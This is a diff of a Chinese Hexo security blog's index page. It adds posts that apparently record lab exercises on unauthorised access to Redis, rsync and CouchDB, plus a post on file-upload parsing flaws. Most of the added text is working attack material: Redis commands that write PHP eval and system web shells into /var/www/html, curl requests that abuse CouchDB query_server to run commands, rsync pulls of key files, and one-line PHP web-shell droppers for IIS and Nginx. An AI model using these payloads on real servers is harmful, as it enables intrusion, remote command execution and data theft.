@@ -105,22 +105,20 @@
   
     <article class="post">
       <div class="post-meta">
-        <span class="post-time">2018-09-18</span>
+        <span class="post-time">2018-10-15</span>
       </div>
       <div class="post-title">
         
-          <a class="post-title-link" href="/2018/09/18/DVWA安装/">
+          <a class="post-title-link" href="/2018/10/15/redis未授权访问/">
             
-              DVWA安装
+              redis未授权访问
             
           </a>
           
         
         <div class="post-tags">
           
-            <p>DVWA</p>
-          
-            <p>test</p>
+            <p>redis未授权访问</p>
           
         </div>
       </div>
@@ -129,18 +127,185 @@
         
 
         
-        <h1 id="1-下载XAMPP"><a href="#1-下载XAMPP" class="headerlink" title="1.下载XAMPP"></a>1.下载XAMPP</h1><h2 id="地址：https-www-apachefriends-org-zh-cn-download-html"><a href="#地址：https-www-apachefriends-org-zh-cn-download-html" class="headerlink" title="地址：https://www.apachefriends.org/zh_cn/download.html"></a>地址：<a href="https://www.apachefriends.org/zh_cn/download.html" target="_blank" rel="noopener">https://www.apachefriends.org/zh_cn/download.html</a></h2>
+        <h4 id="方法一：【推荐】"><a href="#方法一：【推荐】" class="headerlink" title="方法一：【推荐】"></a><strong>方法一：【推荐】</strong></h4><pre><code>root@kali:~/redis-4.0.11# apt-get install redis
+root@kali:~# redis-cli 
+root@kali:~# redis-cli -h 219.153.49.228 -p 44483
+219.153.49.228:44483&gt; info
+</code></pre><p><img src="图片1.jpg" alt="tupian1 ">   //有问题</p>
+<pre><code>219.153.49.228:44483&gt; keys *
+(empty list or set)
+219.153.49.228:44483&gt; CONFIG SET dir /var/www/html/
+OK
+219.153.49.228:44483&gt; set shell &quot;&lt;?php @eval($_POST[&apos;margin&apos;]);?&gt;&quot;
+OK
+219.153.49.228:44483&gt; CONFIG SET dbfilename shell.php
+OK
+219.153.49.228:44483&gt; save
+OK
+</code></pre><h6 id="菜刀连接http-219-153-49-228-46421-shell-php"><a href="#菜刀连接http-219-153-49-228-46421-shell-php" class="headerlink" title="菜刀连接http://219.153.49.228:46421/shell.php"></a>菜刀连接<a href="http://219.153.49.228:46421/shell.php" target="_blank" rel="noopener">http://219.153.49.228:46421/shell.php</a></h6><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h4><blockquote>
+<h5 id="ip-219-153-49-228"><a href="#ip-219-153-49-228" class="headerlink" title="ip:219.153.49.228"></a>ip:219.153.49.228</h5></blockquote>
+<h5 id="1-一个界面安装运行"><a href="#1-一个界面安装运行" class="headerlink" title="1.一个界面安装运行"></a>1.一个界面安装运行</h5><pre><code>$ wget http://download.redis.io/releases/redis-4.0.11.tar.gz
+$ tar xzf redis-4.0.11.tar.gz
+$ cd redis-4.0.11
+$ make
+$ src/redis-server
+$ src/redis-cli
+redis&gt; set foo bar
+OK
+redis&gt; get foo
+&quot;bar&quot;
+</code></pre><h5 id="2-另开一个页面连接"><a href="#2-另开一个页面连接" class="headerlink" title="2.另开一个页面连接"></a>2.另开一个页面连接</h5><pre><code>root@kali:~/redis-4.0.11# cd redis-4.0.11
+root@kali:~/redis-4.0.11# src/redis-cli -h 219.153.49.228 -p 49053//web
+root@kali:~/redis-4.0.11# src/redis-cli -h 219.153.49.228 -p 42267
+219.153.49.228:42267&gt; info
+219.153.49.228:42267&gt; CONFIG SET dir /var/www/html/
+OK
+219.153.49.228:42267&gt; set shell &quot;&lt;?php echo system($_REQUEST[cmd])?&gt;&quot;
+OK
+219.153.49.228:42267&gt; CONFIG SET dbfilename shell.php
+OK
+219.153.49.228:42267&gt; save
+OK
+</code></pre><p>菜刀连接：<a href="http://219.153.49.228:49053/shell.php" target="_blank" rel="noopener">http://219.153.49.228:49053/shell.php</a></p>
+
         
       </div>
     </article>
   
     <article class="post">
       <div class="post-meta">
-        <span class="post-time">2018-08-20</span>
+        <span class="post-time">2018-10-15</span>
       </div>
       <div class="post-title">
         
-          <a class="post-title-link" href="/2018/08/20/hello-world/">
+          <a class="post-title-link" href="/2018/10/15/rsync未授权访问/">
+            
+              rsync未授权访问
+            
+          </a>
+          
+        
+        <div class="post-tags">
+          
+            <p>rsync未授权访问</p>
+          
+        </div>
+      </div>
+      <div class="post-content">
+
+        
+
+        
+        <h5 id="1-连接："><a href="#1-连接：" class="headerlink" title="1.连接："></a>1.连接：</h5><pre><code>root@kali:~# rsync -vvvv rsync://219.153.49.228:47035/ 
+</code></pre><h5 id="2-查看volume下文件"><a href="#2-查看volume下文件" class="headerlink" title="2.查看volume下文件"></a>2.查看volume下文件</h5><pre><code>root@kali:~# rsync -vvvv rsync://219.153.49.228:47035/volume
+</code></pre><h5 id="3-下载cat-key-32158476426747-php到root下"><a href="#3-下载cat-key-32158476426747-php到root下" class="headerlink" title="3.下载cat key_32158476426747.php到root下"></a>3.下载cat key_32158476426747.php到root下</h5><pre><code>root@kali:~# rsync -avz rsync://219.153.49.228:47035/volume/key_32158476426747.php /root
+</code></pre><h5 id="4-查看cat-key-32158476426747-php内容"><a href="#4-查看cat-key-32158476426747-php内容" class="headerlink" title="4.查看cat key_32158476426747.php内容"></a>4.查看cat key_32158476426747.php内容</h5><pre><code>root@kali:~# cat key_32158476426747.php
+</code></pre>
+        
+      </div>
+    </article>
+  
+    <article class="post">
+      <div class="post-meta">
+        <span class="post-time">2018-10-15</span>
+      </div>
+      <div class="post-title">
+        
+          <a class="post-title-link" href="/2018/10/15/CouchDB未授权访问/">
+            
+              CouchDB未授权访问
+            
+          </a>
+          
+        
+        <div class="post-tags">
+          
+            <p>CouchDB未授权访问</p>
+          
+        </div>
+      </div>
+      <div class="post-content">
+
+        
+
+        
+        <blockquote>
+<h4 id="ip-219-153-49-228-端口：49489-apache服务端口-44267"><a href="#ip-219-153-49-228-端口：49489-apache服务端口-44267" class="headerlink" title="ip:219.153.49.228   端口：49489(apache服务端口)  44267"></a>ip:219.153.49.228   端口：49489(apache服务端口)  44267</h4></blockquote>
+<h5 id="1-新增query-server配置，这里执行ifconfig命令"><a href="#1-新增query-server配置，这里执行ifconfig命令" class="headerlink" title="1.新增query_server配置，这里执行ifconfig命令"></a>1.新增query_server配置，这里执行ifconfig命令</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/_config/query_servers/cmd&apos; -d &apos;&quot;/sbin/ifconfig &gt;/var/www/html/a&quot;&apos;【要打两遍】
+</code></pre><h5 id="2-新建一个临时表，插入一条记录"><a href="#2-新建一个临时表，插入一条记录" class="headerlink" title="2.新建一个临时表，插入一条记录"></a>2.新建一个临时表，插入一条记录</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/vultest&apos;
+curl -X PUT &apos;http://219.153.49.228:44267/vultest/vul&apos; -d &apos;{&quot;_id&quot;:&quot;25ea803643bfdf11a87f851d0f8cea83&quot;}&apos;    
+</code></pre><h5 id="3-调用query-server处理数据"><a href="#3-调用query-server处理数据" class="headerlink" title="3.调用query_server处理数据"></a>3.调用query_server处理数据</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/vultest&apos;
+curl -X PUT &apos;http://219.153.49.228:44267/vultest/vul&apos; -d &apos;{&quot;_id&quot;:&quot;25ea803643bfdf11a87f851d0f8cea83&quot;}&apos;
+</code></pre><h5 id="4-看是否能够成功回显出ifconfig内容，图片中成功回显"><a href="#4-看是否能够成功回显出ifconfig内容，图片中成功回显" class="headerlink" title="4. 看是否能够成功回显出ifconfig内容，图片中成功回显"></a>4. 看是否能够成功回显出ifconfig内容，图片中成功回显</h5><p><img src="图片1.jpg" alt="tupian1 "> </p>
+<h5 id="5-查看ls和cat命令路径"><a href="#5-查看ls和cat命令路径" class="headerlink" title="5. 查看ls和cat命令路径"></a>5. 查看ls和cat命令路径</h5><pre><code>root@kali:~# which ls
+/bin/ls
+root@kali:~# which cat
+/bin/cat
+</code></pre><h5 id="6-查看目录"><a href="#6-查看目录" class="headerlink" title="6.查看目录"></a>6.查看目录</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/_config/query_servers/cmd&apos; -d &apos;&quot;/bin/ls &gt;/var/www/html/a&quot;&apos;【要打两遍】
+curl -X POST &apos;http://219.153.49.228:44267/vultest/_temp_view?limit=11&apos; -d &apos;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&apos; -H &apos;Content-Type: application/json&apos;【执行】
+</code></pre><p><img src="图片2.png" alt="tupian2 ">   </p>
+<h5 id="7-查看key-php内容"><a href="#7-查看key-php内容" class="headerlink" title="7.查看key.php内容"></a>7.查看key.php内容</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/_config/query_servers/cmd&apos; -d &apos;&quot;/bin/cat  key.php&gt;/var/www/html/a&quot;&apos;【要打两遍】
+curl -X POST &apos;http://219.153.49.228:44267/vultest/_temp_view?limit=11&apos; -d &apos;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&apos; -H &apos;Content-Type: application/json&apos;【执行】
+</code></pre><p><img src="图片3.png" alt="tupian3 ">   </p>
+
+        
+      </div>
+    </article>
+  
+    <article class="post">
+      <div class="post-meta">
+        <span class="post-time">2018-10-12</span>
+      </div>
+      <div class="post-title">
+        
+          <a class="post-title-link" href="/2018/10/12/文件上传漏洞总结/">
+            
+              文件上传漏洞总结
+            
+          </a>
+          
+        
+        <div class="post-tags">
+          
+            <p>文件上传漏洞总结</p>
+          
+        </div>
+      </div>
+      <div class="post-content">
+
+        
+
+        
+        <h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><hr>
+<blockquote>
+<h4 id="IIS-5-x-6-0-解析漏洞"><a href="#IIS-5-x-6-0-解析漏洞" class="headerlink" title="IIS 5.x/6.0 解析漏洞"></a><strong>IIS 5.x/6.0 解析漏洞</strong></h4></blockquote>
+<h5 id="1-目录解析"><a href="#1-目录解析" class="headerlink" title="1. 目录解析"></a>1. 目录解析</h5><pre><code>/xx.asp/xx.jpg
+</code></pre><h5 id="2-文件解析"><a href="#2-文件解析" class="headerlink" title="2. 文件解析"></a>2. 文件解析</h5><pre><code>xx.asp;.jpg
+</code></pre><blockquote>
+<h4 id="IIS-7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS-7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS7.5/Nginx &lt;8.03畸形解析漏洞"></a><strong>IIS 7.0/IIS7.5/Nginx &lt;8.03畸形解析漏洞</strong></h4></blockquote>
+<h5 id="1-畸形解析实例—–上传X-jpg，内容为"><a href="#1-畸形解析实例—–上传X-jpg，内容为" class="headerlink" title="1. 畸形解析实例—–上传X.jpg，内容为"></a>1. 畸形解析实例—–上传X.jpg，内容为</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问x.jpg/.php ,该目录下会生成1.php一句话木马</p>
+<h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><hr>
+<blockquote>
+<h4 id="Nginx-0-5-0-6-0-7-0-7-65-0-8-0-8-37"><a href="#Nginx-0-5-0-6-0-7-0-7-65-0-8-0-8-37" class="headerlink" title="Nginx 0.5. ,0.6. , 0.7 - 0.7.65, 0.8 - 0.8.37"></a><strong>Nginx 0.5. ,0.6. , 0.7 - 0.7.65, 0.8 - 0.8.37</strong></h4></blockquote>
+<h5 id="1-图片中嵌入PHP代码，然后访问"><a href="#1-图片中嵌入PHP代码，然后访问" class="headerlink" title="1. 图片中嵌入PHP代码，然后访问"></a>1. 图片中嵌入PHP代码，然后访问</h5><pre><code>x.jpg%00.php
+</code></pre><p> 可以执行PHP代码</p>
+<h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><hr>
+<blockquote>
+<h4 id="Apache解析顺序是从右到左，识别不可解析则向左判断"><a href="#Apache解析顺序是从右到左，识别不可解析则向左判断" class="headerlink" title="Apache解析顺序是从右到左，识别不可解析则向左判断"></a><strong>Apache解析顺序是从右到左，识别不可解析则向左判断</strong></h4></blockquote>
+<p> 测试时可以尝试上传一个x.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀</p>
+
+        
+      </div>
+    </article>
+  
+    <article class="post">
+      <div class="post-meta">
+        <span class="post-time">2018-10-08</span>
+      </div>
+      <div class="post-title">
+        
+          <a class="post-title-link" href="/2018/10/08/hello-world/">
             
               Hello World
             
@@ -166,6 +331,37 @@
 <h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 <p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 
+        
+      </div>
+    </article>
+  
+    <article class="post">
+      <div class="post-meta">
+        <span class="post-time">2018-09-18</span>
+      </div>
+      <div class="post-title">
+        
+          <a class="post-title-link" href="/2018/09/18/DVWA安装/">
+            
+              DVWA安装
+            
+          </a>
+          
+        
+        <div class="post-tags">
+          
+            <p>DVWA</p>
+          
+            <p>test</p>
+          
+        </div>
+      </div>
+      <div class="post-content">
+
+        
+
+        
+        <h1 id="1-下载-XAMPP"><a href="#1-下载-XAMPP" class="headerlink" title="1.下载 XAMPP"></a>1.下载 XAMPP</h1><h2 id="地址：https-www-apachefriends-org-zh-cn-download-html"><a href="#地址：https-www-apachefriends-org-zh-cn-download-html" class="headerlink" title="地址：https://www.apachefriends.org/zh_cn/download.html"></a>地址：<a href="https://www.apachefriends.org/zh_cn/download.html" target="_blank" rel="noopener">https://www.apachefriends.org/zh_cn/download.html</a></h2>
         
       </div>
     </article>
